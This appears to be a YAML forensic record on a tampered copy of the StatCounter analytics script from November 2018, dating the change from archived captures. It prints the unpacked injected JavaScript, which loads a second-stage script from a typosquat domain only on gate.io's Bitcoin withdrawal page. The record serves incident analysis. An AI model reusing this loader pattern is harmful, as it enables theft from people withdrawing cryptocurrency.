schema_version: 1
interpretation:
  - >-
    The artifact is a CDN URL, so the sample is whatever statcounter.com returned at a moment inside
    the window. The Archive holds 68 distinct captures across 2018-11-03 to 2018-11-06; only two
    distinct bodies come back, and one of them is tampered.
  - >-
    The capture at 2018-11-03 07:46 still matches the pre-window baseline byte for byte and the
    capture at 11:53 does not, which places the change on the morning of 3 November without relying
    on any report. The captures on 2018-10-04 and 2018-12-07 agree with each other and not with the
    tampered one.
  - >-
    The injection is 573 bytes at offset 13657, packed with the Dean Edwards packer. Unpacked, it
    reads: myselfloc=""+document.location; if(myselfloc.indexOf('myaccount/withdraw/BTC')>-1){ var
    ga=document.createElement('script'); ga.src='https://www.statconuter.com/c.php';
    ga.setAttribute('async','true'); document.documentElement.firstChild.appendChild(ga) }
  - >-
    It is a targeted trigger rather than a broad skimmer: the second stage loads only for a visitor
    whose URL contains myaccount/withdraw/BTC, the Bitcoin withdrawal path on gate.io. The host it
    loads from, statconuter.com, is a transposition typosquat of statcounter.com.
